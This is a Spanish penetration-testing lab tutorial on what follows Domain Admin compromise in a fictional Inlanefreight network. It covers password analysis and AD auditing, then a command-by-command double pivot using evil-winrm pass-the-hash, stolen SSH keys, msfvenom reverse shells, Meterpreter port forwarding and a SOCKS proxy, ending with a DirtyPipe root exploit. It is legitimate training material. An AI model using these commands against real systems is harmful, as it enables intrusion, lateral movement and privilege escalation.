Una vez hemos comprometido el dominio, nuestro trabajo no ha terminado. Hay muchas cosas que podemos hacer para añadir valor adicional a nuestros clientes. Si el objetivo de la evaluación era alcanzar **Domain Admin** y nada más, entonces hemos terminado y debemos asegurarnos de tener todos nuestros comandos/salidas de registros, datos de escaneo y capturas de pantalla y continuar redactando el informe. Si la evaluación estaba enfocada en un objetivo (es decir, gain access to a specific database), debemos continuar trabajando hacia ese objetivo. Los derechos de **Domain Admin** pueden ser solo el comienzo, ya que podría haber otras redes, **domains**, o **forests** en juego a los que necesitaremos encontrar nuestro camino. Si la evaluación es más abierta y el cliente nos pidió que demostremos tanto impacto como sea posible, hay bastantes cosas que podemos hacer para agregar valor y ayudarles a mejorar su postura de seguridad.

---

## Domain Password Analysis - Cracking NTDS

Después de haber volcado la base de datos **NTDS**, podemos realizar un cracking de contraseñas offline con **Hashcat**. Una vez que hayamos agotado todas las reglas y listas de palabras posibles en nuestro equipo de cracking, deberíamos usar una herramienta como [DPAT](https://github.com/clr2of8/DPAT) para realizar un análisis de contraseñas del **domain**. Esto puede complementar muy bien hallazgos como `Weak Active Directory Passwords Allowed`, que anotamos después de un ataque de password spraying exitoso. Este análisis puede ayudar a resaltar el punto y puede ser una visualización poderosa. Nuestro análisis puede incluirse en los apéndices del informe con métricas tales como:

- Número de hashes de contraseña obtenidos
- Número de hashes de contraseña descifrados
- Porcentaje de hashes de contraseña descifrados
- Top 10 contraseñas
- Desglose de longitud de contraseña
- Número de contraseñas de **Domain Admin** descifradas
- Número de contraseñas de **Enterprise Admin** descifradas

---

## Active Directory Security Audit

Como se discutió en el módulo `Active Directory Enumeration & Attacks`, podemos proporcionar un valor adicional a nuestros clientes profundizando en **Active Directory** y encontrando recomendaciones de mejores prácticas y entregándolas en los apéndices de nuestro informe. La herramienta [PingCastle](https://www.pingcastle.com/) es excelente para auditar la postura de seguridad general del **domain**, y podemos extraer muchos elementos diferentes del informe que genera para dar a nuestro cliente recomendaciones sobre formas adicionales en que pueden fortalecer su **AD environment**. Este tipo de trabajo "por encima y más allá del deber" puede generar buena voluntad con nuestros clientes y conducir a tanto negocios repetidos como referencias. Es una gran manera de diferenciarnos y demostrar los riesgos que afectan a los **AD environments** y mostrar nuestra comprensión profunda de la red del cliente.

---

## Hunting for Sensitive Data/Hosts

Una vez que hayamos ganado acceso al **Domain Controller**, probablemente podamos acceder a la mayoría de los recursos en el **domain**. Si queremos demostrar el impacto para nuestros clientes, un buen punto de partida es volver a los **file shares** para ver qué otros tipos de datos podemos ver ahora. Como se discutió en el módulo `Documentation & Reporting`, debemos asegurarnos de solo tomar capturas de pantalla mostrando una lista de archivos si encontramos un **file share** particularmente sensible, y no abrir archivos individuales ni tomar capturas de pantalla o eliminar archivos de la red.

```r
proxychains evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e556xxxxxxxxxxxddbb6e6afa2

ProxyChains-3.1 (http://proxychains.sf.net)

<SNIP>

Evil-WinRM* PS C:\Users\Administrator\desktop> cd c:\

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK

*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022  11:34 AM                Department Shares
d-----        9/15/2018  12:12 AM                PerfLogs
d-r---       12/14/2020   6:43 PM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-r---         6/1/2022  11:07 AM                Users
d-----         6/1/2022  11:10 AM                Windows
```

Regresemos al **share** `Department Shares` y veamos qué más podemos encontrar.

```r
*Evil-WinRM* PS C:\Department Shares> dir

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK


    Directory: C:\Department Shares


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022  11:34 AM                Accounting
d-----         6/1/2022  11:34 AM                Executives
d-----         6/1/2022  11:34 AM                Finance
d-----         6/1/2022  11:33 AM                HR
d-----         6/1/2022  11:33 AM                IT
d-----         6/1/2022  11:33 AM                Marketing
d-----         6/1/2022  11:33 AM                R&D
```

Dependiendo de la industria y el negocio del cliente, hay varias cosas a las que podemos apuntar para demostrar impacto. Los datos de **HR** como salarios y bonificaciones deberían estar bien protegidos, la información de I+D podría potencialmente dañar a una empresa si se filtra, por lo que deberían tener controles adicionales en su lugar. Puede ser una buena práctica no permitir que los **Domain Admins** tengan acceso total a todos los datos, porque si una cuenta es comprometida, entonces todo estará comprometido. Algunas empresas tendrán un sitio separado o un **file share** no unido al **domain** o un servidor de respaldo para alojar datos sensibles. En nuestro caso, Inlanefreight nos ha pedido que probemos si podemos ganar acceso a cualquier host en la subred `172.16.9.0/23`. Esta es su red de gestión y alberga servidores sensibles que no deberían ser accesibles directamente desde hosts en el **domain** principal y ganar derechos de **Domain Admin** no debería conducir a un acceso inmediato.

Dentro del **share** de **IT** privado, podemos ver dos subdirectorios: `Development` y `Networking`. El subdirectorio **Development** alberga el script de respaldo que obtuvimos anteriormente. Echemos un vistazo en el subdirectorio **Networking**.

```r
*Evil-WinRM* PS C:\Department Shares\IT\Private> ls


    Directory: C:\Department Shares\IT\Private


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022  11:34 AM                Development
d-----         6/1/2022  11:34 AM                Networking
```

Podemos ver claves privadas de **SSH** para tres usuarios diferentes. Esto es interesante.

¿Podemos aprovechar cualquiera de estos usuarios para acceder a un host en la red protegida?

Mirando los adaptadores de red en los **Domain Controllers**, podemos ver que tiene una segunda **NIC** en la red 172.16.9.0.

```r
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ipconfig /all

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DC01
   Primary Dns Suffix  . . . . . . . : INLANEFREIGHT.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : INLANEFREIGHT.LOCAL

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-16-51
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::8c6e:6173:2179:e0a5%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.8.3(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.8.1
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-29-62-C9-00-50-56-B9-16-51
   DNS Servers . . . . . . . . . . . : ::1
                                       127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-B9-3A-88
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::ad24:d126:19f:f31d%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.9.3(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.9.1
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-29-62-C9-00-50-56-B9-16-51
   DNS Servers . . . . . . . . . . . : ::1
                                       127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

Escribir `arp -a` para ver la tabla **arp** no produce nada interesante. Podemos usar **PowerShell** para realizar un barrido **ping** e intentar identificar hosts en vivo.

```r
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking>  1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
172.16.9.1: False
172.16.9.2: False
172.16.9.3: True
172.16.9.4: False

<SNIP>

172.16.9.24: False
172.16.9.25: True
172.16.9.26: False
172.16.9.27: False

<SNIP>
```

Podemos ver un host en vivo, `172.16.9.25`, que tal vez una de las claves privadas **SSH** funcionará. Vamos a trabajar. Primero descargamos las claves **SSH** a través de nuestra conexión `evil-winrm` al **Domain Controller**.

```r
Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa 

Info: Downloading C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa to /tmp/ssmallsadm-id_rsa

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> 
```

---

## The Double Pivot - MGMT01

Ahora hay algunas formas de hacer esta siguiente parte, tomaremos la ruta larga para poder finalmente hacer **SSH** directamente al host `172.16.9.25` desde nuestro host de ataque, realizando un doble pivote un tanto alucinante en el proceso. Esto es lo que estamos tratando de lograr, comenzando desde nuestro host de ataque y pivotando a través de los hosts **dmz01** y **DC01** para poder hacer **SSH** directamente en el host **MGMT01** a dos saltos de distancia directamente desde nuestro host de ataque.

`Attack host` --> `dmz01` --> `DC01` --> `MGMT01`

Necesitaremos establecer una **reverse shell** desde la caja `dmz01` de regreso a nuestro host de ataque. Podemos hacer esto de la misma manera que hicimos en la sección `Internal Information Gathering`, creando un payload **ELF**, subiéndolo al objetivo y ejecutándolo para capturar una **shell**. Comience creando el payload **ELF** y subiéndolo de nuevo al host `dmz01` a través de **SCP** si lo eliminó.

A continuación, configure el **Metasploit exploit/multi/handler**.

```r
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.15 
lhost => 10.10.14.15
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
LPORT => 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443
```

Nuevamente, ejecute el archivo `shell.elf` en el sistema objetivo:

```r

root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf 
```

Capture la **Meterpreter shell** usando el **multi/handler**.

```r
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.14.15:443 
[*] Sending stage (989032 bytes) to 10.129.203.111
[*] Meterpreter session 1 opened (10.10.14.15:443 -> 10.129.203.111:58462 ) at 2022-06-21 21:28:43 -0400

(Meterpreter 1)(/tmp) > getuid
Server username: root
```

Luego, configure una regla de reenvío de puerto local para reenviar todo el tráfico destinado al puerto `1234` en `dmz01` al puerto `8443` en nuestro host de ataque.

```r
(Meterpreter 1)(/root) > portfwd add -R -l 8443 -p 1234 -L 10.10.14.15
[*] Reverse TCP relay created: (remote) :1234 -> (local) [::]:1234
```

A continuación, cree un payload ejecutable que subiremos al host **Domain Controller**.

```r
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: dc_shell.exe
```

Suba el payload al **DC**.

```r
*Evil-WinRM* PS C:\> upload "/home/tester/dc_shell.exe" 

Info: Uploading /home/tester/dc_shell.exe to C:\\dc_shell.exe
                                                          
Data: 9556 bytes of 9556 bytes copied

Info: Upload successful!
```

Deje en segundo plano la sesión **Meterpreter**.

```r
(Meterpreter 1)(/root) > bg
[*] Backgrounding session 1...
[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >>
```

Inicie otro **multi/handler** en la misma sesión de **msfconsole** para capturar la **shell** desde el **DC**.

```r
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lhost 0.0.0.0
lhost => 0.0.0.0
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lport 8443
lport => 8443
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> exploit
```

Ejecute el payload en el **DC** y, si todo va según lo planeado, lo capturaremos en nuestro handler.

```r
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc_shell.exe
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:5985-<><>-OK
```

Verificando nuestro handler y vemos la conexión entrante. Parece venir de 0.0.0.0 porque nuestra regla de reenvío de puerto establecida anteriormente ha especificado que todo el tráfico destinado a nuestro host en el puerto 1234 debe ser dirigido a (nuestro listener) en el puerto 8443.

```r
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 0.0.0.0:8443 
[*] Sending stage (200262 bytes) to 10.10.14.15
[*] Meterpreter session 2 opened (10.10.14.15:8443 -> 10.10.14.15:46313 ) at 2022-06-22 21:36:20 -0400

(Meterpreter 2)(C:\) > getuid
Server username: INLANEFREIGHT\Administrator
(Meterpreter 2)(C:\) > sysinfo
Computer        : DC01
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : INLANEFREIGHT
Logged On Users : 3
Meterpreter     : x64/windows
```

Para nuestro próximo truco, configuraremos una ruta a la subred `172.16.9.0/23`.

```r
(Meterpreter 2)(C:\) > run autoroute -s 172.16.9.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.9.0/255.255.254.0...
[+] Added route to 172.16.9.0/255.255.254.0 via 10.10.14.15
[*] Use the -p option to list all active routes
```

Podemos confirmar esto verificando la tabla de enrutamiento de **MSF**.

```r
(Meterpreter 2)(C:\) > background
[*] Backgrounding session 2...
[msf](Jobs:0 Agents:2) exploit(multi/handler) >> route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.9.0         255.255.254.0      Session 2
```

Ahora necesitamos configurar un **socks proxy**, que es el paso final antes de que podamos comunicarnos directamente con la red `172.16.9.0/23` desde nuestro host de ataque.

```r
[msf](Jobs:0 Agents:2) exploit(multi/handler) >> use auxiliary/server/socks_proxy 
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This
                                        must be an address on the local machine or 0.0.0.0 to l
                                        isten on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> set srvport 9050
srvport => 9050
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> set version 4a
version => 4a
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> run
[*] Auxiliary module running as background job 0.
[msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> 
[*] Starting the SOCKS proxy server
```

Edite el archivo `/etc/proxychains.conf` para usar el puerto `9050` que especificamos anteriormente. Si ya tiene una línea allí desde antes, coméntela o reemplace el número de puerto.

Ahora podemos probar esto ejecutando **Nmap** contra el objetivo, y confirmamos que podemos escanearlo.

```r
proxychains nmap -sT -p 22 172.16.9.25

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 21:42 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:80-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:22-<><>-OK
Nmap scan report for 172.16.9.25
Host is up (1.1s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
```

Finalmente, podemos probar cada clave **SSH** con **proxychains** para intentar conectarnos al host.

 Podemos recopilar cada nombre de usuario por el nombre del archivo de la clave **SSH**. En nuestro caso, la clave para `ssmallsadm` funciona (no olvide **chmod 600** el archivo o no podremos conectarnos).

```r
proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:22-<><>-OK
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 23 Jun 2022 01:48:14 AM UTC

  System load:  0.0                Processes:               231
  Usage of /:   27.9% of 13.72GB   Users logged in:         0
  Memory usage: 14%                IPv4 address for ens192: 172.16.9.25
  Swap usage:   0%


159 updates can be applied immediately.
103 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
```

Como paso final, enumeraremos el sistema objetivo, verificando oportunidades de escalada de privilegios locales. Si podemos obtener acceso de nivel **root**, habremos cumplido con el objetivo principal del cliente, ya que afirmaron que este servidor contiene sus "joyas de la corona", o datos más importantes. Durante nuestra enumeración, hacemos una búsqueda en Google basada en la versión del **Kernel** y vemos que probablemente sea vulnerable al [DirtyPipe](https://www.cisa.gov/uscert/ncas/current-activity/2022/03/10/dirty-pipe-privilege-escalation-vulnerability-linux), `CVE-2022-0847`. Podemos leer una excelente explicación de esta vulnerabilidad en el [Hack The Box blog](https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847).

```r
ssmallsadm@MGMT01:~$ uname -a

Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Usaremos **exploit-2** de [este repositorio de GitHub](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits). Como tenemos acceso **SSH** al sistema, podemos crear un archivo con `Vim` y pegar el código del exploit. Luego debemos compilarlo, y afortunadamente `gcc` está presente en el sistema.

```r
ssmallsadm@MGMT01:~$ gcc dirtypipe.c -o dirtypipe
ssmallsadm@MGMT01:~$ chmod +x dirtypipe
ssmallsadm@MGMT01:~$ ./dirtypipe 

Usage: ./dirtypipe SUID
```

Debemos ejecutar el exploit contra un binario **SUID** para inyectar y sobrescribir la memoria en un proceso **root**. Entonces primero necesitamos buscar binarios **SUID** en el sistema.

```r
ssmallsadm@MGMT01:~$ find / -perm -4000 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount

<SNIP>
```

Finalmente, ejecutaremos el exploit contra el binario **SUID** `/usr/lib/openssh/ssh-keysign` y caeremos en una **shell** **root**.

```r
ssmallsadm@MGMT01:~$ ./dirtypipe /usr/lib/openssh/ssh-keysign

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# id
uid=0(root) gid=0(root) groups=0(root),1001(ssmallsadm)
```

Desde aquí, podríamos realizar post-explotación del sistema de archivos para probar el nivel de acceso que hemos logrado.

---

## Data Exfiltration Simulation

Algunos clientes pueden querer probar sus capacidades de `Data Loss Prevention` (**DLP**), por lo que podríamos experimentar con varias formas de exfiltrar datos simulados de su red para ver si somos detectados. Debemos trabajar con el cliente para comprender qué tipos de datos están tratando de proteger y proceder en consecuencia. Es mejor usar datos simulados para no tener que lidiar con datos altamente sensibles del cliente en nuestro sistema de prueba.

---

## Attacking Domain Trusts

Si hay **domain trusts**, podríamos usar nuestras habilidades para enumerar estas relaciones y explotar una relación de confianza child --> parent, una confianza intra-forest, o una confianza de forest externo. Antes de hacerlo, debemos consultar con el cliente para asegurarnos de que el **domain** objetivo está dentro del alcance de la prueba. A veces comprometeremos un **domain** menos importante y podremos usar este acceso para tomar completamente el **domain** principal. Esto puede proporcionar mucho valor al cliente, ya que pueden haber establecido relaciones de confianza apresuradamente como resultado de una fusión y adquisición o conectarse a otra organización. Su **domain** puede estar bien reforzado, pero ¿qué pasa si podemos hacer **Kerberoasting** a través de una confianza de **forest**, comprometer un **forest** asociado y luego encontrar una cuenta en el **forest** asociado que tenga todos los derechos de administrador en nuestro **domain** actual? En esta situación, podríamos demostrar a nuestro cliente que la principal debilidad no está en el **domain** que estamos probando, sino en otro, para que puedan proceder en consecuencia.

---

## Closing Thoughts

Esta sección mostró una muestra de las cosas que podemos hacer `AFTER` lograr **Domain Admin** en un entorno del cliente. Llegar, hackear al cliente y mostrar lo rápido que obtuviste **DA** no sirve de nada para el cliente y no te ayuda a ti ni a tu empresa a retener clientes y difundir una reputación sólida. Lo que hacemos después de lograr **Domain Admin** es extremadamente importante y aquí es donde podemos diferenciarnos de otros probadores que simplemente ejecutan **Responder**, algunas otras herramientas y scripts, un escaneo de **Nessus**, emiten un informe estándar y lo llaman un día. Tu informe entregable debería demostrar el valor de la prueba de penetración por la que tu cliente está pagando y podemos asegurarnos de que estén contentos y regresen en los años siguientes si vamos más allá. Esto no siempre es posible debido a restricciones contractuales y evaluaciones con límite de tiempo, pero incluso si podemos proporcionar un poco más, estamos por delante del grupo. Ten en cuenta que las cosas que identificamos en nuestro informe pueden afectar la financiación de un cliente para el año siguiente y esa financiación probablemente incluye pruebas de penetración. No queremos inflar el informe con hallazgos sin sentido, por supuesto, pero a menudo podemos identificar muchas cosas que nuestro cliente nunca había considerado y ellos y tú estarán mejor por ello.

